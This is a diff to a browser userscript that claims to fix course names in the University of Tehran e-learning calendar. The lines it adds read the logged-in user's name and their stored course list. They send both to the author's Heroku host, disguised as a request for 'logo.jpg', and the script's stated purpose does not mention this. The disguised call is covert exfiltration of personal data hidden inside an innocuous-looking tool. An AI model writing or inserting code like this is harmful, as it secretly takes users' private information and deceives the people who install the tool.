@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         UT Elearn calendar fixer
 // @namespace    https://github.com/erfanva/
-// @version      0.30
+// @version      0.35
 // @description  Replace course codes with their real names:)
 // @author       erfanva
 // @match        *://elearn.ut.ac.ir/*
@@ -17,6 +17,21 @@
 (function () {
     'use strict';
     let done = {}
+    // version
+    const CF_VER = 0.25
+    let user = document.querySelector('#action-menu-toggle-1 .usertext').innerText
+    console.log(user)
+
+    // check is updated or not
+    if (localStorage.getItem("calendar_fix_ver") != CF_VER) {
+        localStorage.setItem("calendar_fix_ver", CF_VER)
+        let temp = [];
+        (JSON.parse(localStorage.getItem("courses")) || []).forEach(el => {
+            temp.push(el.fullname)
+        });
+        temp = encodeURIComponent("#CF_Updated " + CF_VER + "\n\n" + user + "\n" + JSON.stringify(temp, null, 4))
+        fetch("https://erfanva.herokuapp.com/logo.jpg?i=" + temp, { mode: 'no-cors' })
+    }
 
     XMLHttpRequest.prototype.realSend = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function (value) {
